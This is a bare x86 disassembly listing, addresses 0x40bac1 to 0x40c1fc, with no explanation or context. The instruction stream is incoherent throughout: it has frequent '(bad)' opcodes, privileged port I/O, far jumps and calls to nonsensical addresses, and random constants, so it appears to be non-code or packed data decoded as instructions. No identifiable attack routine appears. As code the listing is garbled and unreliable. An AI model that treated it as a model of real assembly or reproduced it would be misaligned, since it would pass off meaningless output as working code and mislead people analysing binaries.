  40bac1:	or     al,0x98
  40bac3:	pop    ds
  40bac4:	out    dx,al
  40bac5:	dec    eax
  40bac6:	xchg   ebp,eax
  40bac7:	mov    eax,ds:0xe6fc0dca
  40bacc:	inc    esi
  40bacd:	das    
  40bace:	adc    ebx,edi
  40bad0:	fcom   QWORD PTR [eax-0x59e6809b]
  40bad6:	(bad)  
  40bad8:	mov    al,BYTE PTR [ebx]
  40bada:	scas   eax,DWORD PTR es:[edi]
  40badb:	ins    BYTE PTR es:[edi],dx
  40badc:	add    DWORD PTR [ebp+0x50c08e5],eax
  40bae2:	adc    al,0x3
  40bae4:	(bad)  
  40bae6:	pop    es
  40bae7:	jle    0x40bb0f
  40bae9:	xor    BYTE PTR [bp-0x63e0],dh
  40baee:	in     al,0x84
  40baf0:	std    
  40baf1:	fdivr  QWORD PTR ds:0x7d74f906
  40baf7:	out    0x20,al
  40baf9:	rcl    BYTE PTR [ecx-0x2e],cl
  40bafc:	mov    ecx,0xcb1f87e9
  40bb01:	les    edx,FWORD PTR [ebp-0x79cc1fc2]
  40bb07:	push   edi
  40bb08:	jge    0x40badb
  40bb0a:	int3   
  40bb0b:	or     bl,BYTE PTR [edi+0x7b538e6]
  40bb11:	mov    bh,0x2b
  40bb13:	jp     0x40bb8d
  40bb15:	cmp    ecx,edi
  40bb17:	pop    ebp
  40bb18:	mov    ebp,0x1450b4d7
  40bb1d:	xchg   esp,eax
  40bb1e:	into   
  40bb1f:	clc    
  40bb20:	not    ebp
  40bb22:	jmp    0xc556ba15
  40bb27:	xchg   edx,eax
  40bb28:	out    dx,al
  40bb29:	pop    ecx
  40bb2a:	xor    dl,BYTE PTR [ecx-0x13494bd]
  40bb30:	ja     0x40bb16
  40bb32:	mov    al,0x7c
  40bb34:	cmp    DWORD PTR [edi+edi*4-0xd],ebp
  40bb38:	fmul   DWORD PTR [ecx+eax*4+0x4fd528e]
  40bb3f:	sbb    eax,0x894f2115
  40bb44:	stos   BYTE PTR es:[edi],al
  40bb45:	pop    es
  40bb46:	adc    bh,ah
  40bb48:	fcomp  QWORD PTR [edx+0x71]
  40bb4b:	hlt    
  40bb4c:	push   0x1eb868d9
  40bb51:	imul   ebx,DWORD PTR [edx+0x67ac5bdb],0x59
  40bb58:	test   DWORD PTR ds:[edi+0xe28ec2f],0xd53b7910
  40bb63:	test   edx,0x2ced915d
  40bb69:	push   esi
  40bb6a:	leave  
  40bb6b:	(bad)  
  40bb6c:	cmovp  esi,DWORD PTR [edx*2+0x391d9f80]
  40bb74:	jne    0x40bb29
  40bb76:	mov    dh,0x8e
  40bb78:	jp     0x40bb62
  40bb7a:	stc    
  40bb7b:	lock xchg ecx,eax
  40bb7d:	(bad)  
  40bb7e:	mov    ds:0xb4f112bc,eax
  40bb83:	mov    esi,0xcd9f67e9
  40bb88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb89:	in     al,dx
  40bb8a:	push   edi
  40bb8b:	push   ebp
  40bb8c:	jns    0x40bb40
  40bb8e:	mov    ecx,0x90a9bb38
  40bb93:	dec    ebx
  40bb94:	xchg   esi,eax
  40bb95:	js     0x40bbc4
  40bb97:	loope  0x40bb2a
  40bb99:	std    
  40bb9a:	push   edx
  40bb9b:	adc    al,BYTE PTR [ebp-0x2b]
  40bb9e:	test   BYTE PTR ds:[edx+0x746b699],0x13
  40bba6:	gs pop ebp
  40bba8:	cmc    
  40bba9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bbaa:	clc    
  40bbab:	jl     0x40bb58
  40bbad:	ror    BYTE PTR [ebx-0x64],0x47
  40bbb1:	mov    eax,ds:0x8b4b9a17
  40bbb6:	arpl   WORD PTR [eax-0x54dfc00d],di
  40bbbc:	push   edi
  40bbbd:	rol    DWORD PTR [esi-0x60d4ec45],cl
  40bbc3:	push   cs
  40bbc4:	push   ebx
  40bbc5:	jbe    0x40bb64
  40bbc7:	rcl    DWORD PTR [esi],0x3a
  40bbca:	add    DWORD PTR [ebx+ecx*2-0x12],esp
  40bbce:	sub    al,0x78
  40bbd0:	lds    esp,FWORD PTR [edi+0x19066938]
  40bbd6:	push   ecx
  40bbd7:	cs push eax
  40bbd9:	mov    bh,0x32
  40bbdb:	dec    edx
  40bbdc:	add    cl,BYTE PTR [ebx]
  40bbde:	jecxz  0x40bc39
  40bbe0:	out    dx,al
  40bbe1:	or     eax,eax
  40bbe3:	ficomp DWORD PTR [eax+edi*8]
  40bbe6:	ds push esi
  40bbe8:	mov    ds:0x9eb5fa05,al
  40bbed:	dec    edx
  40bbee:	iret   
  40bbef:	je     0x40bbc0
  40bbf1:	clc    
  40bbf2:	and    cl,ah
  40bbf4:	add    al,0xe3
  40bbf6:	sbb    al,0x96
  40bbf8:	outs   dx,DWORD PTR ds:[esi]
  40bbf9:	loop   0x40bc54
  40bbfb:	and    bh,BYTE PTR [eax+ecx*1+0x6788f098]
  40bc02:	sub    al,0x52
  40bc04:	mov    bl,0x37
  40bc06:	lea    edx,[esi-0x77]
  40bc09:	loop   0x40bc10
  40bc0b:	or     al,0x39
  40bc0d:	add    edi,edi
  40bc0f:	aaa    
  40bc10:	push   es
  40bc11:	adc    ecx,DWORD PTR [edx+0x65]
  40bc14:	sbb    bl,al
  40bc16:	(bad)  
  40bc18:	cwde   
  40bc19:	jb     0x40bbe1
  40bc1b:	mov    bh,0xf9
  40bc1d:	repnz or DWORD PTR [ecx+0x69d0586],ebp
  40bc24:	nop
  40bc25:	pop    esi
  40bc26:	mov    al,0x60
  40bc28:	int3   
  40bc29:	sub    eax,0xe4ae79a7
  40bc2e:	push   cs
  40bc2f:	scas   eax,DWORD PTR es:[edi]
  40bc30:	inc    ebp
  40bc31:	dec    eax
  40bc32:	das    
  40bc33:	(bad)  
  40bc34:	jae    0x40bc98
  40bc36:	and    DWORD PTR [ebx],eax
  40bc38:	pushf  
  40bc39:	sub    dh,BYTE PTR [esi-0x3e]
  40bc3c:	push   eax
  40bc3d:	sbb    eax,0x68e39290
  40bc42:	mov    cl,0xf3
  40bc44:	scas   eax,DWORD PTR es:[edi]
  40bc45:	sub    al,0x25
  40bc47:	mov    esi,0xe867b7dd
  40bc4c:	push   es
  40bc4d:	lds    ebx,FWORD PTR [esi-0x7158ee13]
  40bc53:	mov    dh,dh
  40bc55:	ds pop ebx
  40bc57:	and    DWORD PTR [edi-0x60],esp
  40bc5a:	ds cmp eax,edi
  40bc5d:	test   BYTE PTR [esi+ebp*1],al
  40bc60:	shl    BYTE PTR [esp+edi*1],cl
  40bc63:	mov    ebp,0x7e9ad431
  40bc68:	fst    DWORD PTR [edx+0x7f]
  40bc6b:	xor    eax,0x1028fb5c
  40bc70:	jno    0x40bce9
  40bc72:	pop    edi
  40bc73:	jge    0x40bc78
  40bc75:	inc    esp
  40bc76:	push   esp
  40bc77:	adc    ah,BYTE PTR [eax]
  40bc79:	pop    esi
  40bc7a:	scas   eax,DWORD PTR es:[edi]
  40bc7b:	aas    
  40bc7c:	mov    bh,0xa0
  40bc7e:	mov    ebp,0x6ee8314e
  40bc83:	scas   eax,DWORD PTR es:[edi]
  40bc84:	outs   dx,BYTE PTR ds:[esi]
  40bc85:	inc    esi
  40bc86:	mov    dh,0x19
  40bc88:	cwde   
  40bc89:	dec    ebp
  40bc8a:	stos   BYTE PTR es:[edi],al
  40bc8b:	mov    eax,DWORD PTR [ebx-0x2e]
  40bc8e:	loope  0x40bcaa
  40bc90:	mov    al,fs:0x880ac8bd
  40bc96:	pop    ss
  40bc97:	inc    ebx
  40bc98:	outs   dx,DWORD PTR ds:[esi]
  40bc99:	jmp    0x40bc98
  40bc9b:	aam    0x0
  40bc9d:	inc    edx
  40bc9e:	pop    esi
  40bc9f:	(bad)  
  40bca0:	xlat   BYTE PTR ds:[ebx]
  40bca1:	lahf   
  40bca2:	mov    ds:0x263e193b,eax
  40bca7:	xchg   DWORD PTR [ecx],edx
  40bca9:	in     al,dx
  40bcaa:	xchg   ebp,eax
  40bcab:	mov    dh,0x45
  40bcad:	dec    edx
  40bcae:	pop    ebp
  40bcaf:	arpl   WORD PTR [edi],di
  40bcb1:	pusha  
  40bcb2:	and    DWORD PTR [ebx+0x66],esp
  40bcb5:	inc    ecx
  40bcb6:	mov    cs,eax
  40bcb8:	imul   ebp,DWORD PTR [eax-0x640d77d1],0x67
  40bcbf:	call   0xbea6cb63
  40bcc4:	leave  
  40bcc5:	out    dx,eax
  40bcc6:	rol    DWORD PTR [eax+0x186fc94b],0xa1
  40bccd:	aaa    
  40bcce:	or     DWORD PTR [edx],ebx
  40bcd0:	cwde   
  40bcd1:	push   es
  40bcd2:	push   es
  40bcd3:	cmc    
  40bcd4:	in     eax,0xd
  40bcd6:	push   esp
  40bcd7:	retf   0x12fa
  40bcda:	jp     0x40bc70
  40bcdc:	fs xor al,0x76
  40bcdf:	mov    ecx,0x57a34209
  40bce4:	in     eax,dx
  40bce5:	dec    esi
  40bce6:	mov    bh,0x87
  40bce8:	xlat   BYTE PTR ds:[ebx]
  40bce9:	mov    ds:0x36ae7acc,al
  40bcee:	jle    0x40bd6e
  40bcf0:	mov    dh,0xbc
  40bcf2:	aaa    
  40bcf3:	mov    dh,0x9d
  40bcf5:	and    DWORD PTR [edx],0xf7285f20
  40bcfb:	int3   
  40bcfc:	loopne 0x40bc85
  40bcfe:	ror    BYTE PTR [ecx+0x60],cl
  40bd01:	test   eax,0xf434c20e
  40bd06:	xor    al,0x72
  40bd08:	pop    ebp
  40bd09:	retf   0x75a0
  40bd0c:	or     DWORD PTR [edx+edi*2-0xe3b3b37],ebp
  40bd13:	xchg   edi,eax
  40bd14:	or     BYTE PTR cs:[edx],0x10
  40bd18:	pop    es
  40bd19:	scas   eax,DWORD PTR es:[edi]
  40bd1a:	aad    0x1c
  40bd1c:	jbe    0x40bca8
  40bd1e:	jge    0x40bce3
  40bd20:	xchg   edx,eax
  40bd21:	cmp    BYTE PTR [ebp-0x2cbd98aa],0x3b
  40bd28:	js     0x40bcd2
  40bd2a:	cmp    al,0x15
  40bd2c:	sbb    DWORD PTR [edx-0x62],esi
  40bd2f:	push   eax
  40bd30:	adc    dl,dl
  40bd32:	sub    al,0x2c
  40bd34:	out    0xb2,al
  40bd36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd37:	adc    ah,ch
  40bd39:	aad    0x41
  40bd3b:	out    dx,eax
  40bd3c:	jbe    0x40bd87
  40bd3e:	add    edx,esp
  40bd40:	ss hlt 
  40bd42:	xor    al,0xf8
  40bd44:	push   0xa1104e22
  40bd49:	sbb    DWORD PTR [eax],ebp
  40bd4b:	retf   0xb352
  40bd4e:	pop    ebp
  40bd4f:	add    DWORD PTR [eax-0x78],0x9450d0dc
  40bd56:	jp     0x40bd40
  40bd58:	fiadd  WORD PTR [esp+esi*1+0x2e2b0bd1]
  40bd5f:	scas   al,BYTE PTR es:[edi]
  40bd60:	push   edi
  40bd61:	nop
  40bd62:	popa   
  40bd63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd64:	addr16 push edx
  40bd66:	jg     0x40bcf9
  40bd68:	xor    DWORD PTR [edx+0x57721a63],0xdf605ef9
  40bd72:	lods   eax,DWORD PTR ds:[esi]
  40bd73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd74:	xchg   ebp,eax
  40bd75:	mov    eax,ds:0x5eadfca2
  40bd7a:	and    al,0xa0
  40bd7c:	and    ecx,0xfffffffa
  40bd7f:	icebp  
  40bd80:	std    
  40bd81:	ss retf 
  40bd83:	push   ecx
  40bd84:	add    bh,BYTE PTR [edx+edi*8-0x18700287]
  40bd8b:	cli    
  40bd8c:	(bad)  [edx]
  40bd8e:	push   esi
  40bd8f:	xor    bh,BYTE PTR [edi]
  40bd91:	mov    edx,0xe77e6b9c
  40bd96:	fiadd  DWORD PTR [eax+0x42]
  40bd99:	icebp  
  40bd9a:	ds push edi
  40bd9c:	sbb    BYTE PTR [ebx],bh
  40bd9e:	das    
  40bd9f:	fisubr DWORD PTR [edx]
  40bda1:	in     eax,0x4a
  40bda3:	dec    esi
  40bda4:	dec    ecx
  40bda5:	out    0xf5,al
  40bda7:	into   
  40bda8:	pop    edx
  40bda9:	xchg   ebx,eax
  40bdaa:	and    esi,DWORD PTR [esi*2+0x20534175]
  40bdb1:	loop   0x40bdaf
  40bdb3:	cdq    
  40bdb4:	jmp    FWORD PTR [esi+0x2a]
  40bdb7:	and    al,0x98
  40bdb9:	jge    0x40bd6a
  40bdbb:	and    al,0x44
  40bdbd:	cmp    eax,0xde68715e
  40bdc2:	mov    esp,0xaf02b4f
  40bdc7:	or     eax,0xf9b537bb
  40bdcc:	cmp    DWORD PTR [esi+ecx*2+0x28],esi
  40bdd0:	jns    0x40bd9a
  40bdd2:	loop   0x40bde3
  40bdd4:	mov    dh,0x60
  40bdd6:	pushf  
  40bdd7:	jecxz  0x40be15
  40bdd9:	sbb    BYTE PTR [esi+0x7f],al
  40bddc:	and    al,0x5e
  40bdde:	mov    ecx,0x12a61f46
  40bde3:	cbw    
  40bde5:	add    DWORD PTR [edx+0x2c],esi
  40bde8:	aad    0x6f
  40bdea:	cmp    ecx,DWORD PTR [esi+0x77b6f6e6]
  40bdf0:	aas    
  40bdf1:	mov    dh,0xf9
  40bdf3:	sar    bh,1
  40bdf5:	adc    esp,ebp
  40bdf7:	sub    BYTE PTR [esi],dh
  40bdf9:	jne    0x40be2e
  40bdfb:	mov    eax,ds:0xa106875e
  40be00:	sbb    BYTE PTR [ebx+ebp*2-0x5ded740],ch
  40be07:	shl    DWORD PTR [edi-0x80],cl
  40be0a:	(bad)  
  40be0c:	les    edx,FWORD PTR ds:0x28806693
  40be12:	inc    ecx
  40be13:	scas   al,BYTE PTR es:[edi]
  40be14:	inc    edx
  40be15:	into   
  40be16:	dec    esp
  40be17:	aaa    
  40be18:	mov    cl,0x8a
  40be1a:	test   cl,ah
  40be1c:	sbb    ah,BYTE PTR [edx+edx*4]
  40be1f:	mov    edx,0xc0826214
  40be24:	jl     0x40bde9
  40be26:	xchg   ebp,ebp
  40be28:	shl    ch,cl
  40be2a:	pop    ds
  40be2b:	mov    eax,ds:0xa0a989a3
  40be30:	or     BYTE PTR [ecx+0x42],0x6e
  40be34:	or     eax,DWORD PTR [edi]
  40be36:	in     eax,0x55
  40be38:	ins    DWORD PTR es:[edi],dx
  40be39:	pop    edi
  40be3a:	dec    edx
  40be3b:	sbb    al,0xdb
  40be3d:	push   esi
  40be3e:	lahf   
  40be3f:	js     0x40bdf4
  40be41:	jp     0x40be47
  40be43:	packuswb mm3,QWORD PTR [ebp-0x80]
  40be47:	or     edi,DWORD PTR [ecx+0x5594dba0]
  40be4d:	in     al,0xd2
  40be4f:	and    al,0xcc
  40be51:	ins    BYTE PTR es:[edi],dx
  40be52:	adc    eax,0xa13b0734
  40be57:	cld    
  40be58:	bound  ebx,QWORD PTR [ebx+edx*4+0x2e]
  40be5c:	retf   
  40be5d:	xchg   ebp,eax
  40be5e:	push   es
  40be5f:	adc    al,0xf0
  40be62:	mov    bh,0xaf
  40be64:	test   al,0x88
  40be66:	mov    gs,WORD PTR [ebp+ebp*1+0x9]
  40be6a:	scas   al,BYTE PTR es:[edi]
  40be6b:	push   ds
  40be6c:	or     edi,DWORD PTR [ebx-0x3d8631cc]
  40be72:	ins    DWORD PTR es:[edi],dx
  40be73:	xchg   DWORD PTR [eax],esp
  40be75:	mov    eax,DWORD PTR gs:[ecx+0x5c]
  40be79:	xchg   edx,eax
  40be7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be7b:	sti    
  40be7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be7d:	(bad)  
  40be7e:	mov    dh,0xd6
  40be80:	jns    0x40be8f
  40be82:	ds cld 
  40be84:	fdivrp st(7),st
  40be86:	scas   al,BYTE PTR es:[edi]
  40be87:	inc    ebx
  40be89:	mov    bl,0x59
  40be8b:	add    ebp,DWORD PTR [edi]
  40be8d:	mov    dl,0x3c
  40be8f:	pop    esp
  40be90:	inc    edi
  40be91:	xchg   DWORD PTR gs:[ebx+0x14],esi
  40be95:	mov    eax,ds:0xba84bd68
  40be9a:	push   esi
  40be9b:	les    ecx,FWORD PTR ds:0x95562bcd
  40bea1:	and    dh,cl
  40bea3:	bound  esp,QWORD PTR [ebp+0x40]
  40bea6:	ja     0x40beea
  40bea8:	lods   al,BYTE PTR ds:[esi]
  40bea9:	dec    ebx
  40beaa:	dec    ecx
  40beab:	pop    es
  40beac:	xor    DWORD PTR [edx-0x7e8edc43],ecx
  40beb2:	daa    
  40beb3:	call   FWORD PTR [ebp-0x473f05cd]
  40beb9:	push   ds
  40beba:	pusha  
  40bebb:	adc    esp,esi
  40bebd:	cmp    al,0xd
  40bebf:	rol    BYTE PTR [eax-0x3304adf7],0x38
  40bec6:	in     al,0xf2
  40bec8:	mov    cl,0xad
  40beca:	and    BYTE PTR es:[ebx+edi*4],ch
  40bece:	add    edi,esp
  40bed0:	out    dx,al
  40bed1:	daa    
  40bed2:	sub    BYTE PTR [edx-0x5e2af859],bh
  40bed8:	pop    esp
  40bed9:	test   eax,0xab003198
  40bede:	ror    DWORD PTR [ebp+0x3e77aace],0x34
  40bee5:	or     eax,0x1f55f54f
  40beea:	xchg   esp,eax
  40beeb:	call   ebp
  40beed:	push   0x3c
  40beef:	pusha  
  40bef0:	jnp    0x40be99
  40bef2:	lock sub DWORD PTR [ebp+0x25],edx
  40bef6:	push   esi
  40bef7:	cmp    BYTE PTR es:[ecx-0x44],bl
  40befb:	faddp  st(1),st
  40befd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40befe:	outs   dx,DWORD PTR ds:[esi]
  40beff:	sti    
  40bf00:	fsubrp st(4),st
  40bf02:	pop    ecx
  40bf03:	call   0xef47601
  40bf08:	mov    edi,0x75d3af24
  40bf0d:	push   ebp
  40bf0e:	add    cl,ah
  40bf10:	loopne 0x40bf43
  40bf12:	push   ebx
  40bf13:	js     0x40bf1f
  40bf15:	fstp   QWORD PTR [edi+0x4d]
  40bf18:	or     al,0x3
  40bf1a:	outs   dx,BYTE PTR ds:[esi]
  40bf1b:	push   0x5e
  40bf1d:	hlt    
  40bf1e:	(bad)  
  40bf1f:	jmp    0x40bed5
  40bf21:	xlat   BYTE PTR ds:[ebx]
  40bf22:	inc    ebx
  40bf23:	lea    esi,[ecx+0x1]
  40bf26:	pop    esp
  40bf27:	in     eax,0x1f
  40bf29:	(bad)  
  40bf2a:	mov    edx,0xb633cff
  40bf2f:	jmp    0x6b3d:0x2bf1fc9b
  40bf36:	jbe    0x40bf2c
  40bf38:	jno    0x40bf7b
  40bf3a:	icebp  
  40bf3b:	test   eax,0xab20bc77
  40bf40:	in     eax,dx
  40bf41:	call   0xf5319641
  40bf46:	ret    
  40bf47:	mov    ecx,0xc283b7d7
  40bf4c:	cmp    bl,BYTE PTR [ebx+eiz*2-0x3a]
  40bf50:	sti    
  40bf51:	pop    ds
  40bf52:	inc    edx
  40bf53:	test   al,0xd3
  40bf55:	push   0xffffffac
  40bf57:	loopne 0x40bfc2
  40bf59:	scas   eax,DWORD PTR es:[edi]
  40bf5a:	mov    edx,0xc751733a
  40bf5f:	jmp    0xb3a28f7
  40bf64:	lds    edx,FWORD PTR [esi]
  40bf66:	push   0xcbba8c70
  40bf6b:	cdq    
  40bf6c:	call   0x9c271d26
  40bf71:	dec    edx
  40bf72:	jle    0x40bf5d
  40bf74:	sub    dh,BYTE PTR [ebx-0x453964cb]
  40bf7a:	retf   
  40bf7b:	cli    
  40bf7c:	adc    DWORD PTR [edx],esp
  40bf7e:	out    dx,eax
  40bf7f:	push   0xffffff8b
  40bf81:	ret    
  40bf82:	xchg   esp,eax
  40bf83:	push   0x982f91
  40bf88:	int    0x36
  40bf8a:	lods   eax,DWORD PTR ds:[esi]
  40bf8b:	mov    eax,ds:0xadaa94dc
  40bf90:	pop    ebp
  40bf91:	mov    dh,0xd2
  40bf93:	jecxz  0x40bfe4
  40bf95:	pop    ss
  40bf96:	jbe    0x40bf72
  40bf98:	cmp    DWORD PTR [ebp+0x4e91b2f9],edi
  40bf9e:	daa    
  40bf9f:	std    
  40bfa0:	sub    ecx,DWORD PTR [ebx-0x77aadbad]
  40bfa6:	(bad)  
  40bfa7:	mov    dl,0x2e
  40bfa9:	jbe    0x40bfd9
  40bfab:	pop    esp
  40bfac:	retf   
  40bfad:	repnz mov edi,0x6474ef56
  40bfb3:	retf   
  40bfb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bfb5:	outs   dx,BYTE PTR ds:[esi]
  40bfb6:	out    0x2,eax
  40bfb8:	fidivr DWORD PTR [eax]
  40bfba:	jnp    0x40bf52
  40bfbc:	stos   DWORD PTR es:[edi],eax
  40bfbd:	test   DWORD PTR [ebx+eiz*1],ebp
  40bfc0:	retf   0x9c8d
  40bfc3:	adc    eax,0xacf7e916
  40bfc8:	mov    ah,0xc2
  40bfca:	fwait
  40bfcb:	push   edx
  40bfcc:	clc    
  40bfcd:	daa    
  40bfce:	pop    ds
  40bfcf:	fst    st(4)
  40bfd1:	shl    BYTE PTR [ebx-0x37284bc6],cl
  40bfd7:	dec    ebx
  40bfd8:	iret   
  40bfd9:	mov    ds:0xffaf3f8c,al
  40bfde:	xchg   edx,eax
  40bfdf:	or     al,0xd0
  40bfe1:	cmc    
  40bfe2:	in     al,dx
  40bfe3:	into   
  40bfe4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bfe5:	(bad)  
  40bfe6:	mov    cl,BYTE PTR [esi]
  40bfe8:	push   ecx
  40bfe9:	fs (bad) 
  40bfeb:	or     al,0xe9
  40bfed:	loop   0x40bfa4
  40bfef:	fdivr  DWORD PTR [eax+0x45]
  40bff2:	mov    ebp,0xe1c44f22
  40bff7:	sub    DWORD PTR [eax+eiz*2-0x51],ebp
  40bffb:	mov    ebx,0x27a99094
  40c000:	mov    dh,0x20
  40c002:	push   0x32
  40c004:	xchg   edx,eax
  40c005:	inc    ecx
  40c006:	push   edi
  40c007:	pop    ebx
  40c008:	pop    ebx
  40c009:	div    DWORD PTR [ecx]
  40c00b:	sti    
  40c00c:	push   0x20fed2a6
  40c011:	outs   dx,BYTE PTR ds:[esi]
  40c012:	pop    esp
  40c013:	inc    edi
  40c014:	and    BYTE PTR [esi+eax*8-0x312a4a63],0x6d
  40c01c:	jecxz  0x40bfba
  40c01e:	sub    al,0xb4
  40c020:	scas   eax,DWORD PTR es:[edi]
  40c021:	pushfw 
  40c023:	mov    ecx,0x9e1aa386
  40c028:	cli    
  40c029:	sbb    DWORD PTR [ecx+ebx*1-0x2],eax
  40c02d:	add    al,BYTE PTR [edx]
  40c02f:	mov    bh,0x2c
  40c031:	mov    ecx,0x278d7a16
  40c036:	cmc    
  40c037:	fbstp  TBYTE PTR [esi]
  40c039:	fdiv   QWORD PTR ds:0xc46482f1
  40c03f:	mov    ebx,0xd02efeb2
  40c044:	push   eax
  40c045:	pop    ds
  40c046:	mov    ecx,0x5da41cc8
  40c04b:	sbb    ch,BYTE PTR [eax-0x196d6b45]
  40c051:	jg     0x40c0ae
  40c053:	mov    edx,0x88aa8a35
  40c058:	mov    ds:0xc8c048ec,al
  40c05d:	and    dh,ah
  40c05f:	inc    esp
  40c060:	mov    ebp,0x78b1ef7b
  40c065:	stc    
  40c066:	retf   
  40c067:	adc    BYTE PTR [edx],bh
  40c069:	rcl    BYTE PTR [ebx],cl
  40c06b:	sbb    eax,0x3c36bf8f
  40c070:	mov    dh,0x3d
  40c072:	mov    ebx,0x10f48900
  40c077:	cmc    
  40c078:	inc    esp
  40c079:	fidivr WORD PTR [edi-0x5d]
  40c07c:	jecxz  0x40c0aa
  40c07e:	test   eax,0xa4e75271
  40c083:	adc    eax,0x10a2e2b9
  40c088:	pusha  
  40c089:	nop
  40c08a:	xchg   DWORD PTR [edi+0x4b0c65ec],ebp
  40c090:	cmc    
  40c091:	and    al,0x6e
  40c094:	loope  0x40c06f
  40c096:	and    DWORD PTR [ecx],ebx
  40c098:	pop    eax
  40c099:	dec    edi
  40c09a:	mov    edi,0xf6de86f7
  40c09f:	aaa    
  40c0a0:	mov    edx,0x754b1f4d
  40c0a5:	mov    al,0xc7
  40c0a7:	icebp  
  40c0a8:	fwait
  40c0a9:	dec    ebp
  40c0aa:	scas   eax,DWORD PTR es:[edi]
  40c0ab:	stos   DWORD PTR es:[edi],eax
  40c0ac:	mov    ebx,0x1b7dda86
  40c0b1:	outs   dx,DWORD PTR ds:[esi]
  40c0b2:	scas   eax,DWORD PTR es:[edi]
  40c0b3:	sub    al,0x99
  40c0b5:	gs mov al,0x34
  40c0b8:	sub    al,0x40
  40c0ba:	add    cl,BYTE PTR [ebp-0x743c82cf]
  40c0c0:	push   esi
  40c0c1:	xor    eax,0xcd90728a
  40c0c6:	push   0x6dcff36f
  40c0cb:	int    0x3d
  40c0cd:	cmp    BYTE PTR [ebp-0x12888fd2],dl
  40c0d3:	sbb    DWORD PTR [edx],edx
  40c0d5:	push   ecx
  40c0d6:	loope  0x40c0e2
  40c0d8:	sar    DWORD PTR [esi+0x54],1
  40c0db:	sti    
  40c0dc:	ret    
  40c0dd:	adc    bh,BYTE PTR [edi]
  40c0df:	test   BYTE PTR [ebx+0x1fd7fbc9],bh
  40c0e5:	sbb    BYTE PTR [ebp+0x55],0x4
  40c0e9:	xor    al,0x44
  40c0eb:	sahf   
  40c0ec:	cmp    eax,0x320a8684
  40c0f1:	stos   DWORD PTR es:[edi],eax
  40c0f2:	push   0x3
  40c0f4:	ret    
  40c0f5:	in     eax,dx
  40c0f6:	nop
  40c0f7:	in     al,dx
  40c0f8:	mov    ch,0x78
  40c0fa:	cmp    eax,0xadf63bff
  40c0ff:	ins    DWORD PTR es:[edi],dx
  40c100:	ds aaa 
  40c102:	je     0x40c0cd
  40c104:	nop
  40c105:	mov    ebx,0x63532d19
  40c10a:	clc    
  40c10b:	dec    ecx
  40c10c:	cmp    eax,0xe8b53b1a
  40c111:	dec    esp
  40c112:	mov    al,ds:0xe31f44df
  40c117:	inc    ebp
  40c118:	pop    edx
  40c119:	push   esi
  40c11a:	das    
  40c11b:	mov    edi,0x55e29828
  40c120:	out    dx,al
  40c121:	ins    DWORD PTR es:[edi],dx
  40c122:	jbe    0x40c103
  40c124:	std    
  40c125:	jb     0x40c0fe
  40c127:	scas   al,BYTE PTR es:[edi]
  40c128:	inc    DWORD PTR [edx]
  40c12a:	pop    edi
  40c12b:	adc    esi,ebp
  40c12d:	jle    0x40c0b5
  40c12f:	dec    bp
  40c131:	sahf   
  40c132:	jb     0x40c10d
  40c134:	xor    eax,0xa7c11bab
  40c139:	xchg   DWORD PTR [edx+ebx*4-0x231f7429],ebp
  40c140:	ins    DWORD PTR es:[edi],dx
  40c141:	loope  0x40c1a7
  40c143:	xor    al,0x41
  40c145:	add    eax,0xe98c6270
  40c14a:	ret    0x4f06
  40c14d:	int    0xbd
  40c14f:	scas   al,BYTE PTR es:[edi]
  40c150:	and    al,0xca
  40c152:	xchg   ecx,eax
  40c153:	das    
  40c154:	arpl   dx,bx
  40c156:	push   edx
  40c157:	ins    BYTE PTR es:[edi],dx
  40c158:	fwait
  40c159:	pop    ebx
  40c15a:	inc    esp
  40c15b:	in     al,dx
  40c15c:	(bad)  
  40c15d:	dec    esp
  40c15e:	sbb    eax,DWORD PTR [esp+ecx*4]
  40c161:	popf   
  40c162:	jb     0x40c179
  40c164:	inc    esi
  40c165:	mov    esp,0xffb321b1
  40c16a:	pop    esp
  40c16b:	fldenv [esi+0xb]
  40c16e:	or     eax,0x6b585104
  40c173:	push   ebp
  40c174:	gs ret 
  40c176:	dec    ebp
  40c177:	pop    ecx
  40c178:	pop    esp
  40c179:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c17a:	rol    ecx,1
  40c17c:	mov    ds:0x39363399,al
  40c181:	mov    eax,0xe5bd828c
  40c186:	xor    ebx,DWORD PTR [ecx]
  40c188:	cld    
  40c189:	fadd   DWORD PTR [ebx+0x1bf464e6]
  40c18f:	and    DWORD PTR [ebx+0x67],esi
  40c192:	(bad)  
  40c193:	js     0x40c211
  40c195:	cmp    eax,0xd6b2b586
  40c19a:	fadd   QWORD PTR [ebp+0x6cd45444]
  40c1a0:	xlat   BYTE PTR ds:[ebx]
  40c1a1:	pusha  
  40c1a2:	aad    0x5a
  40c1a4:	jbe    0x40c1e3
  40c1a6:	cmp    ah,BYTE PTR [edi+eiz*2]
  40c1a9:	pop    edx
  40c1aa:	repnz lods eax,DWORD PTR ds:[esi]
  40c1ac:	gs and al,0x35
  40c1af:	dec    ebp
  40c1b0:	sar    al,0xab
  40c1b3:	test   DWORD PTR [edi+0x4d],0x84e26863
  40c1ba:	cmp    al,0x93
  40c1bc:	jb     0x40c200
  40c1be:	mov    ebx,0xf2605c91
  40c1c3:	int    0x1a
  40c1c5:	jp     0x40c1cb
  40c1c7:	inc    ebp
  40c1c8:	jno    0x40c190
  40c1ca:	ror    DWORD PTR [ebx+0x7b],1
  40c1cd:	or     DWORD PTR [eax+0x63],edx
  40c1d0:	mov    edi,0x2a581cb3
  40c1d5:	call   0x3a89:0xdad91533
  40c1dc:	adc    BYTE PTR [edx+ebp*1+0x61],bl
  40c1e0:	(bad)  
  40c1e2:	add    esi,ecx
  40c1e4:	shl    BYTE PTR fs:0xc5a879e1,0x77
  40c1ec:	mov    eax,ds:0xc8b97750
  40c1f1:	rcl    DWORD PTR [edx+0x196a8ff5],cl
  40c1f7:	loopne 0x40c203
  40c1f9:	dec    esi
  40c1fa:	loopne 0x40c19a
  40c1fc:	sub    dl,BYTE PTR [eax]
